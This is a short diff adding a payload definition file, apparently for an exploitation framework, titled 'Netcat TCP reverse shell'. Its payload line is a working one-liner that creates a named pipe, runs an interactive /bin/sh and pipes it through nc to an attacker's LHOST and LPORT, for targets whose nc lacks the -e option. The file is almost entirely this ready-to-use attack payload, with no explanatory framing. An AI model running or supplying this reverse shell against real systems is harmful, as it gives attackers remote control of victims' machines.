@@ -1,0 +1,5 @@
+title=Netcat TCP reverse shell
+info=Useful with nc with no -e option
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=mkfifo /tmp/RNDSTR;cat /tmp/RNDSTR|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/RNDSTR;rm /tmp/RNDSTR
